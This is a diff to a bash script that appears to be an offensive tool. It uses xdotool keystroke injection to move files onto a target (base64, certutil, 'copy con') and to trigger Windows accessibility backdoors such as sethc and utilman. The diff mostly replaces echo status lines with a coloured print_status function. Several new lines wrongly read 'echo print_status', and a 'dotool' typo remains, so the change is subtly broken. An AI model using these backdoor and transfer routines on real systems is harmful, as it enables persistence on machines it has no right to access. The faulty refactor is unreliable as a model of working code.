@@ -3,19 +3,29 @@
 function print_status {
     local status=$1
     local message=$2
-    # TODO: Add colors
-    # [*] for blue PROGRESS
-    # [+] for green DONE
-    # [!] for yellow WARN
-    # [-] for red ERROR
-    # white to reset colors
-    echo ""
+
+    # Blue for information
+    # Bold Blue for progress
+    # Bold Green for complete
+    # Bold Yellow for warning
+    # Bold Red for error
+    # * default to white 
+    case $status in
+        information) color="\033[34m[*]\033[0m" ;;
+        progress) color="\033[1;34m[*]\033[0m" ;;
+        complete) color="\033[1;32m[+]\033[0m" ;;
+        warning) color="\033[1;33m[!]\033[0m" ;;
+        error) color="\033[1;31m[-]\033[0m" ;;
+        *) color="\033[0m" ;;
+    esac
+
+    echo -e "$color $message"
 }
 
 function check_dependencies() {
     if ! which xdotool &>/dev/null
     then
-        echo "[!] Installing missing dependency..."
+        print_status "warning" "Installing missing dependency..."
         if [[ ! $(which sudo 2>/dev/null) || $UID -ne 0 ]]
         then
             apt install -y xdotool
@@ -52,12 +62,12 @@ function randomize_variable {
 function CmdFile {
     local file=$1
 
-    echo "[*] Executing commands..."
+    echo print_status "progress" "Executing commands..."
     while read -r line
     do
         xdotool_return_input "$line" "return"
     done < "$file"
-    echo "[+] Task completed!"
+    echo print_status "complete" "Task completed!"
 }
 
 function Execute {
@@ -66,9 +76,9 @@ function Execute {
 
     case $method in
         none)
-            echo "[*] Executing commands..."
+            print_status "progress" "Executing commands..."
             xdotool_return_input "$commands" "return"
-            echo "[+] Task completed!"
+            print_status "complete" "Task completed!"
             ;;
         dialogbox)
             DialogBox "$commands"
@@ -77,7 +87,7 @@ function Execute {
             MSBuild "$commands"
             ;;
         *)
-            echo "Invalid Execution Type!" >&2
+            print_status "error" "Invalid Execution Type!" >&2
             exit 1
             ;;
     esac
@@ -86,18 +96,18 @@ function Execute {
 function DialogBox {
     local commands=$1
 
-    echo "[*] Checking one of the lines reaches 260 character limit"
+    print_status "progress" "Checking one of the lines reaches 260 character limit"
     length=$(echo -n "$commands" | wc -c)
     if [ "$length" -ge 260 ]
     then
-        echo "[-] Character Limit reached! Terminating program."
+        print_status "error" "Character Limit reached! Terminating program."
         exit 1
     fi
 
-    echo "[*] Executing commands..."
+    print_status "progress" "Executing commands..."
     xdotool_return_input "Super+r" "custom"
     xdotool_return_input "$commands" "return"
-    echo "[+] Task completed!"
+    print_status "complete" "Task completed!"
 }
 
 function MSBuild {
@@ -135,7 +145,7 @@ function OutputRemoteFile {
             CopyCon "$local_file" "$remote_file" "$platform" "text"
             ;;
         *)
-            echo "Invalid File Transfer Technique!" >&2
+            print_status "error" "Invalid File Transfer Technique!" >&2
             exit 1
             ;;
     esac
@@ -150,7 +160,7 @@ function Base64 {
     # Check if input is passed as file
     if [ -f "$input" ]
     then
-        echo "[*] Transferring file..."
+        print_status "progress" "Transferring file..."
         if [[ "$platform" = "windows" || "$platform" = "linux" && "$mode" = "powershell" ]]
         then
             file_type=$(file "$input")
@@ -186,7 +196,7 @@ EOF
             done < "$file"
         fi
 
-        echo "[+] File transferred!"
+        print_status "complete" "File transferred!"
     fi
 
     # TODO: Finish the implementation
@@ -211,7 +221,7 @@ function PowershellOutFile {
     
     if [[ "$platform" != "windows" && "$platform" != "linux" ]]
     then
-        echo "[-] Only windows and linux are supported for this method!"
+        print_status "error" "Only windows and linux are supported for this method!"
     fi
     
     # TODO: Test the function and modify when necessary
@@ -222,18 +232,18 @@ function PowershellOutFile {
             file_type=$(file "$input")
             if [[ "$file_type" == *"ASCII text"* ]]
             then
-                echo "[*] Checking one of the lines reaches 3477 character limit"
+                print_status "progress" "Checking one of the lines reaches 3477 character limit"
                 while read -r line
                 do
                     length=$(echo -n "$line" | wc -c)
                     if [ "$length" -ge 3477 ]
                     then
-                        echo "[-] Character Limit reached! Terminating program."
+                        print_status "error" "Character Limit reached! Terminating program."
                         exit 1
                     fi
                 done < "$input"
                 
-                echo "[*] Transferring file..."
+                echo print_status "progress" "Transferring file..."
                 xdotool_return_input "@'" "return"
                 while read -r line
                 do
@@ -242,14 +252,14 @@ function PowershellOutFile {
                 
                 xdotool_return_input "'@ | Out-File $output_file" "return"
             else
-                echo "[!] This is a binary file! Switching to \"pwshcertutil\" method instead..."
+                echo print_status "warning" "This is a binary file! Switching to \"pwshcertutil\" method instead..."
                 PowershellOutFile "$input" "$output_file" "$platform" "certutil"
             fi
             
             
         elif [ "$mode" = "certutil" ]
         then
-            echo "[*] Transferring file..."
+            print_status "progress" "Transferring file..."
             file=$(base64 -w 64 "$input")
             xdotool_return_input "@'" "return"
             xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
@@ -267,7 +277,7 @@ function PowershellOutFile {
         fi
     fi
     
-    echo "[+] File transferred!"
+    echo print_status "complete" "File transferred!"
 }
 
 function CopyCon {
@@ -284,18 +294,18 @@ function CopyCon {
     
     if [[ -f "$input" && "$mode" = "text" ]]
     then
-        echo "[*] Checking one of the lines reaches 255 character limit"
+        print_status "progress" "Checking one of the lines reaches 255 character limit"
         while read -r line
         do
             length=$(echo -n "$line" | wc -c)
             if [ "$length" -ge 255 ]
             then
-                echo "[-] Character Limit reached! Terminating program."
+                print_status "error" "Character Limit reached! Terminating program."
                 exit 1
             fi
         done < "$input"
 
-        echo "[*] Transferring file..."
+        print_status "progress" "Transferring file..."
         xdotool_return_input "copy con $output_file" "return"
 
         # TODO: Test it to ensure it's functional
@@ -315,7 +325,7 @@ function CopyCon {
     then
         # TODO: Be sure to modify and test that it works
 
-        echo "[*] Transferring file..."
+        print_status "progress" "Transferring file..."
         # TODO: replace temp.txt to randomize function
         xdotool_return_input "copy con temp.txt" "return"
         xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
@@ -331,7 +341,7 @@ function CopyCon {
         dotool_return_input "del /f temp.txt" "return"
     fi
 
-    echo "[+] File transferred!"
+    print_status "complete" "File transferred!"
 }
 
 function CreateUser {
@@ -355,13 +365,13 @@ function StickyKey {
     # Add a cleanup method
     if [ "$platform" != "windows" ]
     then
-        echo "[-] Registry keys only exists on Windows operating system user!"
+        print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    echo "[*] Activating sethc.exe (sticky keys) backdoor..."
+    print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
     xdotool_return_input "shift shift shift shift shift" "custom"
-    echo "[+] Backdoor Activated!"
+    print_status "complete" "Backdoor Activated!"
 }
 
 function UtilityManager {
@@ -375,9 +385,9 @@ function UtilityManager {
         exit 1
     fi
 
-    echo "[*] Activating utilman.exe (utility manager) backdoor..."
+    print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
     xdotool_return_input "Super+u" "custom"
-    echo "[+] Backdoor Activated!"
+    print_status "complete" "Backdoor Activated!"
 }
 
 function Magnifier {
@@ -391,10 +401,10 @@ function Magnifier {
         exit 1
     fi
 
-    echo "[*] Activating magnifier.exe backdoor..."
+    print_status "progress" "Activating magnifier.exe backdoor..."
     xdotool_return_input "Super+equal" "custom"
     xdotool_return_input "Super+minus" "custom"
-    echo "[+] Backdoor Activated!"
+    print_status "complete" "Backdoor Activated!"
 }
 
 function Narrator {
@@ -404,13 +414,13 @@ function Narrator {
     # Add a cleanup method
     if [ "$platform" != "windows" ]
     then
-        echo "[-] Registry keys only exists on Windows operating system user!"
+        print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    echo "[*] Activating narrator.exe backdoor..."
+    print_status "progress" "Activating narrator.exe backdoor..."
     xdotool_return_input "Super+Return" "custom"
-    echo "[+] Backdoor Activated!"
+    print_status "complete" "Backdoor Activated!"
 }
 
 function DisplaySwitch {
@@ -420,13 +430,13 @@ function DisplaySwitch {
     # Add a cleanup method
     if [ "$platform" != "windows" ]
     then
-        echo "[-] Registry keys only exists on Windows operating system user!"
+        print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    echo "[*] Activating displayswitch.exe backdoor..."
+    print_status "progress" "Activating displayswitch.exe backdoor..."
     xdotool_return_input "Super+p" "custom"
-    echo "[+] Backdoor Activated!"
+    print_status "complete" "Backdoor Activated!"
 }
 
 function Persistence {
